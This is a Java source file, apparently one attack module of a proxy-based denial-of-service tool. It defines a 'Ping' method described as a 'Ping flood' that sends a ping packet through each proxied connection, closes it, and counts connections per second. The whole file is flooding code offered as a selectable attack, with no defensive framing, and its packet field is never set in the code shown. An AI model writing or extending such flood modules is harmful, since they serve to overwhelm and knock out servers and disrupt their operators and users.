package dev.lastknell.core.methods.impl;

import dev.lastknell.core.NettyBootstrap;
import dev.lastknell.core.methods.IMethod;
import dev.lastknell.core.packets.PingPacket;
import dev.lastknell.core.proxy.Proxy;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class Ping implements IMethod{

    private PingPacket packet;
    private NettyBootstrap service;

    @Override
    public void accept(Channel channel, Proxy proxy) {
        service.oppnedCPS++;
        channel.writeAndFlush(Unpooled.buffer().writeBytes(packet.getWrappedPacket()));
        channel.close();
        service.successfulCPS++;
    }

    @Override
    public void init(NettyBootstrap service) {
        this.service = service;
    }

    @Override
    public String getName() {
        return "Ping";
    }

    @Override
    public String getDesc() {
        return "Ping flood";
    }

    @Override
    public boolean isExperimental() {
        return false;
    }
    
}
